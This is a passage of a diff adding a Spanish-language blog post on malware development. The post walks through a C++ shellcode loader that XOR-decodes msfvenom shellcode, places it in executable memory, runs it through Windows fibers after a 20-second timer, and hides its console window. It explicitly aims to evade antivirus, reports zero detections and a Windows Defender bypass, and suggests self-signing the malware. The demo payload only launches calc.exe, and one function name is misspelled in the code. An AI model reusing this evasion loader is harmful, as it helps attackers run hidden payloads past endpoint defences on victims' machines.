+    	<span class="n">KillTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">idEvent</span><span class="p">);</span>
+  	<span class="p">});</span>
+
+  	<span class="n">MSG</span> <span class="n">msg</span><span class="p">;</span>
+  	<span class="k">while</span> <span class="p">(</span><span class="n">GetMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>	
+    	<span class="n">TranslateMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
+    	<span class="n">DispatchMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
+  	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+	
+	<span class="n">HWND</span> <span class="n">ventana_cmd</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
+	<span class="n">ShowWindow</span><span class="p">(</span><span class="n">ventana_cmd</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
+
+	<span class="n">LPVOID</span> <span class="n">main_fiber</span> <span class="o">=</span> <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+  	<span class="n">LPVOID</span> <span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">shellcode_routine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">main_fiber</span><span class="p">);</span>
+
+  	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="funcion-fiber_injection">Funcion fiber_injection()</h2>
+
+<ul>
+  <li>Dentro de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection()</code> tenemos la definicion de nuestra shellcode, esa shellcode fue generada con msfvenom usando crifrado XOR la cual ejecuta el comando <code class="language-plaintext highlighter-rouge">calc.exe</code>: <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/exec CMD=calc.exe -f c --encrypt xor --encrypt-key z</code>.</li>
+</ul>
+
+<p>(te recomiendo cambiar la clave del cifrado XOR)</p>
+
+<ul>
+  <li>Posteriormente para poder inyectar la shellcode, la debemos de decifrar en tiempo de ejecucion usando la operacion <code class="language-plaintext highlighter-rouge">XOR</code> con la clave de cifrado, y para eso usamos este for:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+	<span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="sc">'z'</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Usando <code class="language-plaintext highlighter-rouge">unsigned int shellcode_len = sizeof(shellcode);</code> le estamos diciendo que obtenga el tamaño total en bytes de la shellcode</p>
+  </li>
+  <li>
+    <p>Despues necesitamos asignar memoria para nuestra shellcode, para esto usamos <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</p>
+  </li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
+	    <span class="nb">NULL</span><span class="p">,</span>
+	    <span class="n">shellcode_len</span><span class="p">,</span>
+	    <span class="n">MEM_COMMIT</span><span class="p">,</span>
+	    <span class="n">PAGE_EXECUTE_READWRITE</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<p>El primer parametro de la direccion de memoria donde se va a asignar, y le puse NULL para que el sistema operativo lo haga, el segundo parametro es el tamaño en bytes que se van a asignar, y le pase la variable que tiene el tamaño, el tercero es el tipo de asignacion y le puse <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code> para que inicialmente la asignacion contenga puros ceros, y el ultimo argumento son las protecciones de memoria que tendra esa asignacion, y le puse que tenga permisos de ejecucion, escritura, y lectura</p>
+
+<ul>
+  <li>Despues se copia la shellcode en la memoria que se asigno con <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>A este punto ya tenemos la memoria lista para nuestra shellcode, ahora debemos de crear una fibra, para eso usamos <code class="language-plaintext highlighter-rouge">CreateFiber</code>:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Lo que esta haciendo es crear una fibra, donde la ejecucion de la fibra comienza desde la direccion que regresa <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, el primer parametro es el tamaño del stack de la fibra, le puse en 0 para que agarre el tamaño por defecto, el segundo parametro es la direccion inicial de la fibra, y observa que el segundo parametro se agrego de esta forma <code class="language-plaintext highlighter-rouge">(LPFIBER_START_ROUTINE)exec_mem</code>, y lo que esta haciendo <code class="language-plaintext highlighter-rouge">LPFIBER_START_ROUTINE</code> es definir un puntero como una rutina, que vendria siendo una funcion de callback a nuestra direccion de inicio de la fibra, la cual se encuentra en <code class="language-plaintext highlighter-rouge">exec_mem</code></p>
+
+<ul>
+  <li>Despues de que creamos la fibra, debemos de restaurar el estado de la fibra de la shellcode para ejecutarla, para eso usamos</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>El unico parametro que recibe es la direccion de la fibra, la cual se almacena en <code class="language-plaintext highlighter-rouge">shellcode_fiber</code>.</p>
+
+<ul>
+  <li>Las ultima dos funciones solo son para eliminar la fibra despues de que se ejecute y liberar memoria</li>
+</ul>
+
+<p>Asi que todo lo que se encuentra dentro de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code> es solamente para hacer una clasica inyeccion de fibras, a este punto ya se implemento la primera tecnica, y para que esa funcion se ejecute solo hay que llamarla asi <code class="language-plaintext highlighter-rouge">fiber_injection()</code></p>
+
+<hr>
+
+<h2 id="funcion-shellcode_routine-callback">Funcion shellcode_routine (callback)</h2>
+
+<ul>
+  <li>
+    <p>Despues en el codigo tenemos una funcion callback, donde se implementa la segunda tecnica (timming attack), esta implementacion del callback vendria siendo una implementacio manual de <code class="language-plaintext highlighter-rouge">LPFIBER_START_ROUTINE</code></p>
+  </li>
+  <li>
+    <p>Lo que tenemos primero es un temporizador que agregara un delay de 20 segundos antes de ejecutar la fibra que contiene la shellcode:</p>
+  </li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">UINT_PTR</span> <span class="n">timerId</span> <span class="o">=</span> <span class="n">SetTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20000</span><span class="p">,</span> <span class="p">[](</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">uMsg</span><span class="p">,</span> <span class="n">UINT_PTR</span> <span class="n">idEvent</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwTime</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fiber_injection</span><span class="p">();</span><span class="n">witchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+    <span class="n">KillTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">idEvent</span><span class="p">);</span>
+<span class="p">});</span>	
+
+</code></pre></div></div>
+
+<p>Dentro de los parametros de <code class="language-plaintext highlighter-rouge">SetTimer</code> le indicamos en milisegundos el tiempo que va a esperar para ejecutarse lo que se encuentre dentro, y en este caso es la llamada a la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code>, esto es una clasica implementacion de un timming attack que agrega un pequeño delay al inicio de la ejecucion del malware para evadir los antivirus</p>
+
+<ul>
+  <li>Despues tenemos un pequeño bucle declarado de esta forma:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="p">(</span><span class="n">GetMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>	
+    	<span class="n">TranslateMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
+    	<span class="n">DispatchMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Donde con <code class="language-plaintext highlighter-rouge">GetMessage</code> le estamos diciendo que se siga ejecutando hasta que reciba una señal de salida, esa señal de salida se manda a llamar desde <code class="language-plaintext highlighter-rouge">TranslateMessage</code> y <code class="language-plaintext highlighter-rouge">DispatchMessage</code>, esto se usa por que debemos de procesar los mensajes, y con ayuda de esas funciones, la fibra esta respondiendo a los mensajes recibidos y manteniendo la ejecución en curso.</p>
+
+<p>Asi que toda la funcion <code class="language-plaintext highlighter-rouge">VOID CALLBACK shellcode_routine</code> implementa una funcion de callback para hacer un timming attack en la fibra de la shellcode.</p>
+
+<hr>
+
+<h2 id="funcion-main">Funcion Main</h2>
+
+<p>A este punto ya solo nos queda mandar a llamar a la funcion <code class="language-plaintext highlighter-rouge">main()</code>,</p>
+
+<ul>
+  <li>Lo primero que tenemos en el main son dos funciones que lo que hacen es ocultar la ventana del cmd que se abre al ejecutar el binario:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HWND</span> <span class="n">ventana_cmd</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
+<span class="n">ShowWindow</span><span class="p">(</span><span class="n">ventana_cmd</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Despues se esta conviertiendo el hilo principal en una fibra:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="n">main_fiber</span> <span class="o">=</span> <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Esto con el fin de cambiar de contexto entre las fibras</p>
+
+<ul>
+  <li>La funcion que sigue crea una fibra donde el segundo parametro es el callback creado anteriormente:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">shellcode_routine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Despues ejecuta la fibra creada anteriormente:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">witchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y por ultimo ejecuta la fibra principal</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">main_fiber</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Como te daras cuenta, se ejecutan 3 fibras</p>
+
+<ul>
+  <li>La fibra principal</li>
+  <li>La fibra de la shellcode que manda a llamar al callback <code class="language-plaintext highlighter-rouge">shellcode_routine</code>
+</li>
+  <li>Y la fibra de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code>, yo la llamo la <code class="language-plaintext highlighter-rouge">fibra comodin</code>
+</li>
+</ul>
+
+<p>Ahora te preguntaras “¿Por que 3 fibras, si solo una es la que inyecta la shellcode?”, pues ahi te va la explicacion de por que las 3 fibras evaden los antivirus</p>
+
+<p>Las 3 fibras se usan de la siguiente manera, cuando en el main se ejecuta la primera fibra que manda a llamar a <code class="language-plaintext highlighter-rouge">shellcode_routine</code>, lo que va a pasar es que entrara a la funcion callback y esperara 20 segundos para ejecutar la <code class="language-plaintext highlighter-rouge">fibra comodin</code>, mientras que a su vez en el main se hace un llamado para ejectutar otra fibra, que es la fibra principal (main_fiber), y lo que estaria pasando es que la fibra que mando a llamar a <code class="language-plaintext highlighter-rouge">shellcode_routine</code> y la <code class="language-plaintext highlighter-rouge">main_fiber</code> se estarian ejecutandose en contextos diferentes, permitiendo que la ejecucion de la <code class="language-plaintext highlighter-rouge">fibra comidin</code> pase desapercibida por los antivirus ocultando su actividad e inyectando la shellcode mientras que el programa sigue fluyendo normalmente ejecutandose en el hilo principal mediante la <code class="language-plaintext highlighter-rouge">main_fiber</code>, asi que los antivirus lo unico que estarian detectando es la <code class="language-plaintext highlighter-rouge">main_fiber</code> que no tiene un comportamiendo extraño, Genial, ¿No?.</p>
+
+<h4 id="resultados">Resultados</h4>
+
+<p>0/26 antiscan.me - Fecha: 15 de junio del 2023</p>
+
+<p><img src="/assets/img/bypassAV_fiber/antiscanme.png" alt=""></p>
+
+<p>Bypass Windows defender:</p>
+
+<video src="/assets/img/bypassAV_fiber/poc.mp4" controls="controls" width="720"></video>
+
+<h4 id="mejoras-rapidas">Mejoras rapidas</h4>
+
+<p>Aun que el defender no lo haya detectado, es evidente que se puede mejorar para evitar la deteccion cuando se descarga e intenta ejecutar un software desconocido, es decir, cuando no tiene ninguna firma de un certificado de autenticidad, para evadir eso, puedes firmar el malware generando un certificado tu mismo</p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/img/bypassAV_fiber/waifu.gif" alt=""></p>
+
+
+    </div>
+    
+    
+</article>
+<div class="post-nav">
+<a class="previous" href="/maldev/2023/06/15/maldev-createRemoteThread.html" title="Inyeccion de shellcode via CreateRemoteThread + IsDebuggerPresent">Inyeccion de shellcode via CreateRemoteThread +...</a><a class="next" href="/hackthebox/2023/06/26/htb-jupiter.html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML">HackTheBox Jupiter - SQLi a RCE,...</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/explotacion%20binaria/2023/01/22/rand-ld_preload.html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML">Hijack de rand() usando LD_PRELOAD trick</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2023/01/24/picoCTF-here's-a-libc.html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML">picoCTF Here's a libc - ret2libc y bypass ASLR</a></li>
+<li><a class="post-link" href="/hackthebox/2023/05/23/htb-pc.html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML">HackTheBox PC - SQL injection in gRPC service</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2022/07/29/ret2libc.html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML">ret2libc bypass NX</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+  
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+  
+  
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --></section>
+</div>
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div align="center" class="wrapper">
+    <div class="site-footer-inner">
+<div class="footer-col rss-subscribe">
+	  <font size="1" color="gray">
+	  <!--RSS SVG-->
+   	<svg aria-hidden="true" fill="#ff4e00" height="12" width="12" viewbox="0 0 16 16" version="1.1" data-view-component="true" class="octicon octicon-rss mr-1">
+    <path fill-rule="evenodd" d="M2.002 2.725a.75.75 0 01.797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 11-1.497.098 10.502 10.502 0 00-9.776-9.776.75.75 0 01-.7-.798zM2 13a1 1 0 112 0 1 1 0 01-2 0zm.84-5.95a.75.75 0 00-.179 1.489c2.509.3 4.5 2.291 4.8 4.8a.75.75 0 101.49-.178A7.003 7.003 0 002.838 7.05z"></path>
+    </svg>
+	  <a href="/feed.xml" target="_blank"> RSS </a>订阅 |  
+    <!--提供支持-->
+    由 <a title="Jekyll is a simple, blog-aware, static site
+    generator." href="http://jekyllrb.com/" target="_blank">Jekyll</a> &amp; <a title="Yat, yet
+    another theme." href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">Yat Theme</a>提供支持
+	  </font>
+</div>
+
+    <!--版权-->
+    <div>
+    <font size="1" color="gray">
+    Copyright © 2017-2023 <a href="https://github.com/ic4rta/">c4rta</a> All Rights Reserved
+    </font>
+</div>
+
+      <!--logo
+  <div>
+
+    <a href="https://github.com/vanhiupun" target="_blank">
+      <img src="https://visitor-badge.glitch.me/badge?page_id=vanhiupun.visitor-badge&right_color=Orange" alt="visitor" />
+    </a> 
+	    
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml" target="_blank">
+        <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml/badge.svg" />
+    </a>
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml" target="_blank">
+      <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml/badge.svg">
+    </a> 
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io" target="_blank">
+      <img src="https://www.codefactor.io/repository/github/vanhiupun/vanhiupun.github.io/badge" alt="CodeFactor" />
+    </a>
+    
+    <a href="https://codeclimate.com/github/vanhiupun/Vanhiupun.github.io/maintainability">
+      <img src="https://api.codeclimate.com/v1/badges/708da11ffb90a8f6f13b/maintainability" alt="maintainability" />
+    </a>
+    
+    <a href="https://rubygems.org/gems/jekyll-theme-yat" target="_blank">
+        <img src="https://badge.fury.io/rb/jekyll-theme-yat.svg"     alt="jekyll-theme-yat" />
+    </a> 
+    
+    <a href="https://github.com/vanhiupun" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Repository-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Github" />
+    </a> 
+          
+    <a href="https://vanhiupun.github.io" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Page-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Blog" />
+    </a> 
+          
+    <a href="mailto:fanxiaobin422@gmail.com" target="_blank">
+        <img src="https://img.shields.io/badge/Send%20me%20Gmail-EA4335?style=flat-square&logo=Gmail&logoColor=ffffff" alt="Gmail" />
+    </a> 
+          
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/blob/c0c037532393ee2718892f87b200a0bbe33e7eb9/License" target="_blank">
+        <img src="https://img.shields.io/badge/License%20MIT-f2cb05?style=flat-square&logo=Mitsubishi&logoColor=222222" alt="MIT" />
+    </a>
+          
+    <a href="http://jekyllthemes.org/" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%20Themes-f2cb05?style=flat-square&logo=Jekyll&logoColor=222222" alt="jekyll-themes" />
+    </a> 
+    
+    <a href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%C2%B7Theme%C2%B7Yat-f2cb05?style=flat-square&logo=github&logoColor=181717" alt="Jekyll-yat" />
+    </a> 
+      
+    <a href="https://raw.githubusercontent.com/vanhiupun/Vanhiupun.github.io/master/assets/images/img/zz.png" target="_blank">
+        <img src="https://img.shields.io/badge/GitHub%20Sponsors-EA4335?style=flat-square&logo=GitHub%20Sponsors&logoColor=222222" alt="/GitHub%20Sponsors" />
+    </a> 
+  </div>-->
+  </div>
+  </div>
+</footer>
+</body>
+</html><html>
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+</html>
